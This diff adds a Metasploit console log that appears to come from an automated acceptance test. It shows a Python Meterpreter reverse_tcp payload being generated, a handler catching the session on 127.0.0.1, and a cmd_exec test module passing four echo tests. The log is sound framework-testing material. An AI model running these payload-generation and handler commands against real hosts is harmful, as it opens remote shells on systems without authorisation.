@@ -1,0 +1,36 @@
+use python/meterpreter/reverse_tcp
+msf6 payload(python/meterpreter/reverse_tcp) > generate -o D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220204-644-tffen7.py -f raw AutoVerifySessionTimeout=10 MeterpreterTryToFork=false PythonMeterpreterDebug=true lport=6002 lhost=127.0.0.1
+[*] Writing 493 bytes to D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220204-644-tffen7.py...
+msf6 payload(python/meterpreter/reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 1
+msf6 payload(python/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6002 
+[*] Sending stage (39804 bytes) to 127.0.0.1
+[*] Meterpreter session 2 opened (127.0.0.1:6002 -> 127.0.0.1:50005 ) at 2022-02-04 03:12:57 +0000
+use test/cmd_exec
+msf6 post(test/cmd_exec) > run session=2 AddEntropy=true Verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * missing Meterpreter features: stdapi_fs_chmod
+[*] Running against session 2
+[*] Session type is meterpreter and platform is windows
+[*] Starting cmd_exec stderr tests
+before running test: should return the stderr output
+[+] should return the stderr output
+[*] Starting cmd_exec tests
+before running test: should return the result of echo
+[*] meterpreter?
+expected: uFao - [117, 70, 97, 111] - ASCII-8BIT
+actual: uFao - [117, 70, 97, 111] - ASCII-8BIT
+[+] should return the result of echo
+[*] Session does not support sleep, skipping sleep tests
+[*] Finished cmd_exec tests
+[*] Starting cmd_exec quote tests
+before running test: should return the result of echo with single quotes
+[+] should return the result of echo with single quotes
+before running test: should return the result of echo with double quotes
+[+] should return the result of echo with double quotes
+[*] Testing complete in 1.1369526
+[*] Passed: 4; Failed: 0
+[*] Post module execution completed
+msf6 post(test/cmd_exec) > 
